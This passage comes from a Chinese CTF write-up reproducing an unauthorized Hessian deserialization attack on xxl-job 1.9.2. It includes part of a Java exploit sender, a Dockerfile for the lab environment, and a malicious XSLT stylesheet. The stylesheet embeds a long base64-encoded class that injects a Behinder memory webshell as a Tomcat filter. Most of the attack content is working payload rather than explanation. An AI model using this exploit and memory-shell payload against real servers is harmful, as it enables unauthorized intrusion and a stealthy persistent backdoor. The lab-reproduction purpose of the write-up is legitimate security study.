class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>);<br>        <span class="hljs-comment">// å…è®¸è¾“å‡º</span><br>        connection.setDoOutput(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//è®¾ç½®è¯·æ±‚ä½“</span><br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> connection.getOutputStream();<br>        outputStream.write(poc);<br>        <span class="hljs-comment">// è·å–å“åº”ç </span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> connection.getResponseCode();<br>        System.out.println(<span class="hljs-string">&quot;Response Code: &quot;</span> + responseCode);<br>        <span class="hljs-comment">// å…³é—­è¿æ¥</span><br>        connection.disconnect();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241127214635292.png" alt="image-20241127214635292"></p><blockquote><p>æ¬¸æˆ‘æœäº†æ‰“äº†å‡ æ¬¡æ²¡ååº”ï¼Œçœ‹äº†ä¸€ä¸‹å®¹å™¨æ—¥å¿—ï¼Œè¯´java.lang.ClassNotFoundException: sun.swing.SwingLazyValueï¼Œæ€ªäº†ï¼Œæˆ‘çœ‹äº†ä¸€ä¸‹adminç»„ä»¶çš„javaç‰ˆæœ¬</p><p>æˆ‘å»æ€ä¹ˆæ˜¯jdk21çš„ç‰ˆæœ¬çš„ğŸ˜“ï¼Œè¿™Tomcaté•œåƒç›´æ¥ç»™æˆ‘æ‹‰äº†ä¸€ä¸ª21çš„jdkï¼Œé‚£å°±æ”¹ä¸€ä¸‹adminçš„dockerfileï¼Œæ”¹æˆæ‰‹åŠ¨è£…tomcatå’Œjdkäº†</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># ä½¿ç”¨å®˜æ–¹Javaé•œåƒä½œä¸ºåŸºç¡€é•œåƒ</span><br><span class="hljs-keyword">FROM</span> dockerpull.org/openjdk:<span class="hljs-number">8</span>-jdk<br><br><span class="hljs-comment"># è®¾ç½®ç¯å¢ƒå˜é‡</span><br><span class="hljs-keyword">ENV</span> TOMCAT_WEBAPPS /usr/local/tomcat/webapps<br><span class="hljs-keyword">ENV</span> TIME_ZONE Asia/Shanghai<br><br><span class="hljs-comment"># å®‰è£…Tomcat</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> wget https://downloads.apache.org/tomcat/tomcat-9/v9.0.97/bin/apache-tomcat-9.0.97.tar.gz -O /tmp/tomcat.tar.gz \</span><br><span class="language-bash">    &amp;&amp; tar -xzf /tmp/tomcat.tar.gz -C /usr/local \</span><br><span class="language-bash">    &amp;&amp; <span class="hljs-built_in">rm</span> /tmp/tomcat.tar.gz \</span><br><span class="language-bash">    &amp;&amp; <span class="hljs-built_in">ln</span> -s /usr/local/apache-tomcat-9.0.97 /usr/local/tomcat</span><br><br><span class="hljs-comment"># æ¸…ç†é»˜è®¤çš„Tomcatåº”ç”¨</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/* <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/docs <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/examples <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/host-manager <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/manager</span><br><br><span class="hljs-comment"># è®¾ç½®æ—¶åŒº</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">ln</span> -snf /usr/share/zoneinfo/<span class="hljs-variable">$TIME_ZONE</span> /etc/localtime &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$TIME_ZONE</span> &gt; /etc/timezone</span><br><br><span class="hljs-comment"># æ·»åŠ ä½ çš„åº”ç”¨åˆ°Tomcatçš„webappsç›®å½•</span><br><span class="hljs-keyword">ADD</span><span class="language-bash"> ./xxl-job-admin-1.9.2 <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/</span><br><br><span class="hljs-comment"># æ¸…ç†ä¸´æ—¶æ–‡ä»¶</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rf /tmp/*</span><br><br><span class="hljs-comment"># æš´éœ²Tomcatçš„ç«¯å£</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br><br><span class="hljs-comment"># å¯åŠ¨Tomcat</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> /usr/local/tomcat/bin/startup.sh &amp;&amp; <span class="hljs-built_in">tail</span> -F /usr/local/tomcat/logs/catalina.out</span><br></code></pre></td></tr></table></figure></blockquote><p>ç°åœ¨å†æ‰“ä¸€é</p><p><img src="https://cdn.clown2024.cn/image-20241127221633717.png" alt="image-20241127221633717"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸæ‰“è¿›å»äº†ï¼Œè¯æ˜expæ˜¯æ²¡é—®é¢˜çš„ï¼Œç°åœ¨å°±è¯¥è€ƒè™‘æ‰“ä»€ä¹ˆå†…å­˜é©¬äº†</p><blockquote><p>ç„¶åè¿™é‡Œæ‰“ç€æ‰“ç€çªç„¶å‘ç°äº†å¥‡æ€ªçš„é—®é¢˜ï¼Œæˆ‘ç°åœ¨æ‰“çš„æ˜¯apiçš„æœªæˆæƒï¼Œè€Œä¸”åˆæ˜¯åœ¨tomcatèµ·çš„æœåŠ¡ï¼Œæ€ä¹ˆwpæ‰“çš„æ˜¯jettyå†…å­˜é©¬å‘¢</p><p>åæ¥çœ‹äº†ä¸€ä¸‹é¢˜ç›®åªç»™äº†executorçš„ç«¯å£ï¼Œè€Œè¯¥ç‰ˆæœ¬çš„executorä¹Ÿæ˜¯å­˜åœ¨æœªæˆæƒæ‰“hessianååºåˆ—åŒ–çš„ï¼Œå…·ä½“çš„å¯ä»¥çœ‹ä¸€ä¸‹æ–‡ç« ï¼Œæ‰€ä»¥æˆ‘æ‰“åŠå¤©æ‰“é”™ç«¯å£äº†ğŸ˜¡ï¼Œé‚£ä¹Ÿå…ˆå¤ç°æ‰“ä¸€ä¸‹apiå§ï¼Œç­‰ä¼šå†æ‰“é¢˜ç›®çš„executoræœªæˆæƒ</p></blockquote><p>è¿™é‡Œç”¨ä¸€æ¬¾javaå†…å­˜é©¬ç”Ÿæˆå·¥å…·ï¼š<a href="https://github.com/pen4uin/java-memshell-generator-release">https://github.com/pen4uin/java-memshell-generator-release</a></p><p><img src="https://cdn.clown2024.cn/image-20241128173522354.png" alt="image-20241128173522354"></p><p>ç”Ÿæˆå¯¹åº”çš„å†°èå†…å­˜é©¬</p><p>ç„¶åxsltæ–‡ä»¶æ”¹æˆè¿™æ ·</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:b64</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ob</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Thread&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ru</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils&quot;</span></span><br><span class="hljs-tag">&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bs&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;b64:decodeBuffer(b64:new(),&#x27;yv66vgAAADEBsgEAG29yZy9qdW5pdC9tL0VuY3J5cHRpb25VdGlscwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAA1nZXRVcmxQYXR0ZXJuAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAARDb2RlAQACLyoIAAgBAAxnZXRDbGFzc05hbWUBAChjaC5xb3MubG9nYmFjay5Db250ZXh0TG9hZGVyQ2F5emJ2RmlsdGVyCAALAQAPZ2V0QmFzZTY0U3RyaW5nAQAKRXhjZXB0aW9ucwEAE2phdmEvaW8vSU9FeGNlcHRpb24HAA8BABBqYXZhL2xhbmcvU3RyaW5nBwARAQpESDRzSUFBQUFBQUFBLzZWWENYY1QxeFgrbmlWN1pGbUVJSUt4Z0FRbkthREZ0aEtNcVpFSmllVTR3WWx0VWlzMWRad3VZMmxrQ1dTTjBJd2NSSmVrNmI2blRiZDAzMGwzMGdZWkJ3SjBDdzFObTI3dXYwbFB2emNqeVpJc0c4N3BPZGFiZWUvZTk5Mzd2cnU4OGZYL3ZuSVp3TDM0ajRBL25ncWYwbzF3UnArZlUrTW53eU42MXRST20rTzZtdER5STJyeHpOemlRK21NcWVVVkNJRnRKOVJGTlp4UnMvUGhrWXhxR0xhYUFvZkFiVkowT214bytjV01ab1lybTFvRnhEdzMrbWVqZ2ZHRzNVTUN6aEU5b1Fsc0hrOW50Y25Dd3B5V2YxeWR5M0RGTzY3SDFjeTBtay9MZVhuUmFhYlNoa0J3L0dhZHBnVXhKOUF5R3hYb1NHaEpXckVzQzJ5blEyTmphMTN5NEZac2NjTUpyMERiNFhRMmJSNFJjUGdEMHg3Y2htMVMwQ213dzkrNHp6WTlGSmltd1RqUjE1RkxrQzRKc2xQQWxkQnRKd1ZtYmJ4VjltTDJjMG83VmRBTWMyZzlxWkhUczRiV0tMWlJSMUpxT21zNXRIWFZsOUhUY1MxbnB2V3NndDBDaXFFWkJpY0MzUTBRS2RQTWhZOXlpTmthNU5HaHo1MlFnYkxBQ21ZNkU1NVFjMXpmVnQ0YXp4ZHpwaDRlU2VkU051OWFSZFpnbXJKYmpMcnpDZHl4OGZscDE2Zy9zOER1RzVEQ2dDZFhpUkRZdVFGTHBDSmZjV1hmK2xRMCtPVEtWNTFwak4vYVRWV3Y5dHdVdklMOUFudHZEbFRCQVlGTk1aT1Z3SkNVUzhXZDBtVEdUYW9MVmpHdHhpRm01dFBaZVdiaTJ6SFlqaFljRW1pZjE4eWpsanB0K3RmcUJwcHRIOExoRHZUalB2SnNtNXBXTXdYTmcvdHQyQWNFYm0zY3BZQmw2SXF6V0VrNmEzQm5YUm1sMUh4TUhqNGIxNFlDVDNqd0lFYmRHTUZEUEF2OWkxVlM5UzUvNEViSjZzRlJqRW5uSGhIWXNwcXZSMVVqUllJVWpMc3hnVTRYK2toYlhUb3JlSXlKbmlzd0RRWnJmVHMyZDBLTGw4dXdiaVd3ZHNtREtjUTY4QTQ4N3NJOUx0ekpTaWk0OEM0MnJ4ejdnQWRQMlB6TU11azNQb2FDZDVNdE9tTVJ5OFJzRXBrbUhyRlJ2UmZ2NjhCN29QSXN3Nk14RitMbEh0QlFwQXFJMmtGdXg3S0dxWkoyZ2NDNjBXOHNjQS9ta1hJamlUUkxzVTdCeUdseFZtTThyNW1QYXNVWVp3cE84aVEwRkMyYUd1UHU5QWRtb3g0c0lDc0RyTnZOdUlsaHErZWVjaU1ESnFaVDltS3BPbVpyR2xxOGtFK2J4VENOV0tvbUN0S2Z4YnJFczFsUmNOcDJvTno4dC9xYk5mNHplTDhiUlh5QTNhWkJxT0JEYkZxVi9YWXZGL0N0UmFtMitXZndZVGVleHJOdWhwcTlmdGRHN1UzQngrd2FuQ3JYNEk0S2NGb1BSd3ZKcEpiWEVyYU15Si9BSnp2d2NYeEtvTE81am9MUFdMMUpUY2hMbFJlenYybjlmZzZmZCtPeitBSVBsdENqcXFFZFBQQ2dGcmR1NDg1bVdTQWo5a1Y4U1I3b2VmWkxlWGxsMVF3dlNYbXpTK0ZYOEZYSi85YzhVT0NTYWk4d3U3TGFVNnZaVmU5SnRWNitpVzlKcnI1TkxCS2laZ3o1dWRBa3M5a1R2b3Z2eVJCOW4rU3YyODBWL0ZEZ2dmL3ZScFg1ZER0KzNJRWY0U2ZzUDlXN3k2amNwbVI5N0ZqTmJmclROZVZjaHF6UitibEFhenlqbmpuRHJ0VGtVMGhKV1BUbjY5dDErZkRNLzBVMVA4Q0tOa3hxZEJxRmJOOUMyb2ozUllkam81WEk1VjM0TFhHU2VybnQ3N2xCTDY4ay9ubVVaQUNXQkR5MkQzWkN1YkJzNStXRVpxYjBSSlhVT3J6Wk5YaTFGdkphTWtQM3d6WUNUVjNFSlducVZZR3U5YlFVWEdFbXBMT0wra21lNFZDVFRKaTl5VWI4Ty96ZWphdjRnNExONWFiUUp6dDluNTN0THJ4bVh5MVY4djVNdXpZQkxseG5XMnZNb1hLUzZkbGtldDc2c3ZJa2ExWlk1UnZwV3dGbThQUWlmWm5iZjI5eTRFQmljT0RRb05yZmZ6RHV3dDhwbjlKa0dkT1JmOUtScWVTQ3NiRGd3cjl4SjJ2SkNTN0J3WkgzQjcvZGhieStyZWY5MXBOZjU3THNPTFp6ZGgvMVcvaHNENFljb2N0TDJIcU9reGE0T2JaUkJXeXJIUnc3YlNWNHNBbXczbTdCWnNxRi9OUXRRNDFTUis3WUhseml6L3VQODNneTZQM1hlVVNDM3BYekdINnBDdXkyd0xZVHRNc0M5OWpieXVBU3Nxc00rUmcxcFc1WE1MU0VYVGZHM0VtVVhUVU9kMVVkN29JUE95eUhiOGNkbEJGZFhPSVJwWldWMEZYMFI1dzlWekVRYWZVNWd5OGpzb3dqTFhnTkw5Yk0rREpjd3NNdjRIbXB2b3hIQlNKdEZ6RXhzNFRKaU9KVHZNZEN5M2luQThmNU91MXJyYjRmOTdXVjM5dThNd1I1Y2hsekRuZ1RGM0FpNHZLNVdpOGlZeTJYa1BNbWxtQ1U4TlJGdE13RVMvaGdDUjlad2tkOXJpQ1JQeTFRd25NbGZMbUVyNWZ3alJLKzQxTksrTUh4cytqb0RmVXM0NndEWjdFcDBsYVp2TVNqZW5BTjE5SE5aSkFVUFFJdng5MDhkRGNsZHlPTXR5R0NQYnhYOTJJUys1Z3VmamJsSUF5RWVNSDE0RG4wNGhMNmNJV2ExL2lKZEozL0JyNkIvVXl6QXhiRlNhSkc4Q3lUN2k1aWpyRFozazFFaFh1akpIc1BVK3dOL3ZZU3VVMlNYQTNGQ3UwRXJKQ3YwRnJJQ3RRSzdmWFN6emE4U1l0aEpxVUhyK01lV216RlFjcTN3UGtXcmlqb1Z6Q2dSQlYwdCtORkswVmI4RFA4Z21DOGIreW80aTJ1dHZKWjlMNThBUmNtZXJ5dk9GL0Ywek1PNzBpc2hNczlKSTd6NG93anhPa2ZyK0pQMWI5ekU5NXIzREhaNjMzZHdSMVVGbndXcVJWeCtwd01oL2N2dFVnKzUzbzQxdG1rN3hYbWQxZ01ESEk4eE5VSU9Semk3RERHV1g2U3lTT1V0SkdKWCtKWFBNUWdocTAzQitXOStEWE9rWTM5ZUpnUjNXZHhWYXd5V2NSdnFDMHNobGl0cDhpTFJZdHNBZDM4bVl5QVRjcUFWU2pNK2RXS3NjczdXbE10b2dvczhGZjhqV01GVERMOFpyWFFRNVpHRTdEUm1uS3VndjBQbkcyM3IwTVFBQUE9CAATAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAVABYKABIAFwEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HABoBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAZmaWx0ZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAdjb250ZXh0AQAIY29udGV4dHMBABBMamF2YS91dGlsL0xpc3Q7AQAEdGhpcwEAHUxvcmcvanVuaXQvbS9FbmNyeXB0aW9uVXRpbHM7AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAJExqYXZhL3V0aWwvTGlzdDxMamF2YS9sYW5nL09iamVjdDs+OwEADmphdmEvdXRpbC9MaXN0BwAnAQASamF2YS91dGlsL0l0ZXJhdG9yBwApAQANU3RhY2tNYXBUYWJsZQwAFQAZCgAEACwBAApnZXRDb250ZXh0AQASKClMamF2YS91dGlsL0xpc3Q7DAAuAC8KAAIAMAEACGl0ZXJhdG9yAQAWKClMamF2YS91dGlsL0l0ZXJhdG9yOwwAMgAzCwAoADQBAAdoYXNOZXh0AQADKClaDAA2ADcLACoAOAEABG5leHQBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAOgA7CwAqADwBAAlnZXRGaWx0ZXIBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAPgA/CgACAEABAAlhZGRGaWx0ZXIBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYMAEIAQwoAAgBEAQAEa2V5MQEACGNoaWxkcmVuAQATTGphdmEvdXRpbC9IYXNoTWFwOwEAA2tleQEAC2NoaWxkcmVuTWFwAQAGdGhyZWFkAQASTGphdmEvbGFuZy9UaHJlYWQ7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3RocmVhZHMBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBQAQAQamF2YS9sYW5nL1RocmVhZAcAUgEAEWphdmEvdXRpbC9IYXNoTWFwBwBUAQATamF2YS91dGlsL0FycmF5TGlzdAcAVgoAVwAsAQAKZ2V0VGhyZWFkcwgAWQEADGludm9rZU1ldGhvZAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7DABbAFwKAAIAXQEAB2dldE5hbWUMAF8ABgoAUwBgAQAcQ29udGFpbmVyQmFja2dyb3VuZFByb2Nlc3NvcggAYgEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDABkAGUKABIAZgEABnRhcmdldAgAaAEABWdldEZWDABqAFwKAAIAawEABnRoaXMkMAgAbQgARwEABmtleVNldAEAESgpTGphdmEvdXRpbC9TZXQ7DABwAHEKAFUAcgEADWphdmEvdXRpbC9TZXQHAHQLAHUANAEAA2dldAwAdwA/CgBVAHgBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsMAHoAewoABAB8AQAPamF2YS9sYW5nL0NsYXNzBwB+CgB/AGABAA9TdGFuZGFyZENvbnRleHQIAIEBAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoMAIMAhAsAKACFAQAVVG9tY2F0RW1iZWRkZWRDb250ZXh0CACHAQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwAiQCKCgBTAIsBAAh0b1N0cmluZwwAjQAGCgB/AI4BABlQYXJhbGxlbFdlYmFwcENsYXNzTG9hZGVyCACQAQAfVG9tY2F0RW1iZWRkZWRXZWJhcHBDbGFzc0xvYWRlcggAkgEACXJlc291cmNlcwgAlAgAIAEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uBwCXAQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWDAAVAJkKAJgAmgEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uBwCcAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcAngEAK2phdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb24HAKABAAlTaWduYXR1cmUBACYoKUxqYXZhL3V0aWwvTGlzdDxMamF2YS9sYW5nL09iamVjdDs+OwEAE2phdmEvbGFuZy9UaHJvd2FibGUHAKQBAAljbGF6ekJ5dGUBAAJbQgEAC2RlZmluZUNsYXNzAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQALY2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgcArgEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAsACxCgBTALIBAA5nZXRDbGFzc0xvYWRlcgwAtACKCgB/ALUMAAoABgoAAgC3AQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwAuQC6CgCvALsMAA0ABgoAAgC9AQAMZGVjb2RlQmFzZTY0AQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgwAvwDACgACAMEBAA5nemlwRGVjb21wcmVzcwEABihbQilbQgwAwwDECgACAMUIAKgHAKcBABFqYXZhL2xhbmcvSW50ZWdlcgcAyQEABFRZUEUMAMsAqwkAygDMAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DADOAM8KAH8A0AEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcA0gEADXNldEFjY2Vzc2libGUBAAQoWilWDADUANUKANMA1gEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DADYANkKAMoA2gEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwA3ADdCgDTAN4BAAtuZXdJbnN0YW5jZQwA4AA7CgB/AOEBAA1nZXRGaWx0ZXJOYW1lAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAxsYXN0RG90SW5kZXgBAAFJAQAJY2xhc3NOYW1lAQASTGphdmEvbGFuZy9TdHJpbmc7AQABLggA6QEAC2xhc3RJbmRleE9mAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJDADrAOwKABIA7QEACXN1YnN0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwwA7wDwCgASAPEBAAlmaWx0ZXJEZWYBAAlmaWx0ZXJNYXABAAJlMgEADGNvbnN0cnVjdG9ycwEAIFtMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAMZmlsdGVyQ29uZmlnAQANZmlsdGVyQ29uZmlncwEAD0xqYXZhL3V0aWwvTWFwOwEADmNhdGFsaW5hTG9hZGVyAQAPZmlsdGVyQ2xhc3NOYW1lAQAKZmlsdGVyTmFtZQEAI1tMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I8Kj47BwD3AQARZ2V0Q2F0YWxpbmFMb2FkZXIMAQAAigoAAgEBDADjAOQKAAIBAwEADWZpbmRGaWx0ZXJEZWYIAQUBAF0oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAFsBBwoAAgEIAQAvb3JnLmFwYWNoZS50b21jYXQudXRpbC5kZXNjcmlwdG9yLndlYi5GaWx0ZXJEZWYIAQoBAAdmb3JOYW1lDAEMALoKAH8BDQEAL29yZy5hcGFjaGUudG9tY2F0LnV0aWwuZGVzY3JpcHRvci53ZWIuRmlsdGVyTWFwCAEPAQAkb3JnLmFwYWNoZS5jYXRhbGluYS5kZXBsb3kuRmlsdGVyRGVmCAERAQAkb3JnLmFwYWNoZS5jYXRhbGluYS5kZXBsb3kuRmlsdGVyTWFwCAETAQA9KExqYXZhL2xhbmcvU3RyaW5nO1pMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylMamF2YS9sYW5nL0NsYXNzOwwBDAEVCgB/ARYBAA1zZXRGaWx0ZXJOYW1lCAEYAQAOc2V0RmlsdGVyQ2xhc3MIARoBAAxhZGRGaWx0ZXJEZWYIARwBAA1zZXREaXNwYXRjaGVyCAEeAQAHUkVRVUVTVAgBIAEADWFkZFVSTFBhdHRlcm4IASIMAAUABgoAAgEkAQAwb3JnLmFwYWNoZS5jYXRhbGluYS5jb3JlLkFwcGxpY2F0aW9uRmlsdGVyQ29uZmlnCAEmAQAXZ2V0RGVjbGFyZWRDb25zdHJ1Y3RvcnMBACIoKVtMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7DAEoASkKAH8BKgEADXNldFVSTFBhdHRlcm4IASwBABJhZGRGaWx0ZXJNYXBCZWZvcmUIAS4BAAxhZGRGaWx0ZXJNYXAIATABAB1qYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcgcBMgoBMwDWAQAnKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DADgATUKATMBNggA+QEADWphdmEvdXRpbC9NYXAHATkBAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwBOwE8CwE6AT0BAA9wcmludFN0YWNrVHJhY2UMAT8AGQoAGwFAAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24HAUIBACBqYXZhL2xhbmcvSW5zdGFudGlhdGlvbkV4Y2VwdGlvbgcBRAEAAWkBAAxkZWNvZGVyQ2xhc3MBAAdkZWNvZGVyAQAHaWdub3JlZAEACWJhc2U2NFN0cgEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47AQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcggBTAEADGRlY29kZUJ1ZmZlcggBTgEACWdldE1ldGhvZAwBUADPCgB/AVEBABBqYXZhLnV0aWwuQmFzZTY0CAFTAQAKZ2V0RGVjb2RlcggBVQEABmRlY29kZQgBVwEADmNvbXByZXNzZWREYXRhAQADb3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAmluAQAeTGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW07AQAGdW5nemlwAQAfTGphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtOwEABmJ1ZmZlcgEAAW4BAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcBYgEAHGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW0HAWQBAB1qYXZhL3V0aWwvemlwL0daSVBJbnB1dFN0cmVhbQcBZgoBYwAsAQAFKFtCKVYMABUBaQoBZQFqAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAVAWwKAWcBbQEABHJlYWQBAAUoW0IpSQwBbwFwCgFnAXEBAAV3cml0ZQEAByhbQklJKVYMAXMBdAoBYwF1AQALdG9CeXRlQXJyYXkBAAQoKVtCDAF3AXgKAWMBeQEAA29iagEACWZpZWxkTmFtZQEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABGdldEYBAD8oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAX8BgAoAAgGBAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAYMKAYQA1goBhAB4AQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwGHAQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DAGKAYsKAH8BjAEADWdldFN1cGVyY2xhc3MMAY4AewoAfwGPCgGIABcBAAx0YXJnZXRPYmplY3QBAAptZXRob2ROYW1lAQAHbWV0aG9kcwEAG1tMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAIUxqYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBAApwYXJhbUNsYXp6AQASW0xqYXZhL2xhbmcvQ2xhc3M7AQAFcGFyYW0BABNbTGphdmEvbGFuZy9PYmplY3Q7AQAGbWV0aG9kAQAJdGVtcENsYXNzBwGVAQASZ2V0RGVjbGFyZWRNZXRob2RzAQAdKClbTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAZ8BoAoAfwGhCgDTAGABAAZlcXVhbHMMAaQAhAoAEgGlAQARZ2V0UGFyYW1ldGVyVHlwZXMBABQoKVtMamF2YS9sYW5nL0NsYXNzOwwBpwGoCgDTAakKAJ8AFwEACmdldE1lc3NhZ2UMAawABgoAnQGtCgCYABcBAAg8Y2xpbml0PgoAAgAsACEAAgAEAAAAAAAQAAEABQAGAAEABwAAAA8AAQABAAAAAxIJsAAAAAAAAQAKAAYAAQAHAAAAEAABAAEAAAAEEwAMsAAAAAAAAQANAAYAAgAOAAAABAABABAABwAAABcAAwABAAAAC7sAElkTABS3ABiwAAAAAAABABUAGQABAAcAAADYAAMABQAAADYqtwAtKrYAMUwruQA1AQBNLLkAOQEAmQAbLLkAPQEATiottwBBOgQqLRkEtgBFp//ipwAETLEAA